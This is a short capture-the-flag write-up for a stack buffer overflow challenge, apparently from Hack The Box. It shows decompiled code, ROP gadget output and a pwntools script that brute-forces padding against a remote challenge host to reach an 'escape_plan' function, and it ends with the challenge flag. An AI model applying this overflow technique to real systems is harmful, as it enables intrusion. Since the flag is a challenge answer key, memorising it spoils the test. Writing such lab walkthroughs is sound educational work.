---
ai_date: '2025-04-27 05:16:28'
ai_summary: Exploited stack-based buffer overflow with ROP to jump to 'escape_plan'
  at 0x00401255, using 'A' repeated N times and a crafted RET address.
ai_tags:
- rop
- bof
- ret2addr
created: 2024-07-17T02:27
points: 975
solves: 65
tags:
- rop
updated: 2024-08-04T19:33
---

We can trace where `flag.txt` is being read with xrefs.
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1721197843/2024/07/e62b4570083b8286b45a72507f1b0359.png)

We have to jump to `0x00401255` `escape_plan`.

Reading `main`.

```cpp
iVar1 = strncmp(s1, "69", 2);
if (iVar1 != 0) {
	iVar1 = strncmp(s1, "069", 3);
	if (iVar1 != 0) goto code_r0x004015da;
}
```

Using `ROPgadget` to get the ret addresses.

```
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401112 : ret 0x2e

Unique gadgets found: 2
```

## Solve Script

Payload is `'A' * N + RET + 0x00401255`.

```python
from pwn import *
context.log_level = 'error'

for i in range(100):
    if i % 100 == 0:
        print(i)
    conn = remote("94.237.53.113", 52654)
    conn.recvuntil(b'>> ')
    conn.sendline(b'069')
    conn.recvuntil(b'>> ')
    conn.sendline(b'A'*i+p64(0x401016)+p32(0x00401255))
    data = conn.recvall()
    conn.close()
    if data != b'\n\x1b[1;31m[-] YOU FAILED TO ESCAPE!\n\n' and data != b'':
        print('\n', i, data)
    print('.', end='', flush=True)
    i += 1
# HTB{3sc4p3_fr0m_4b0v3}
```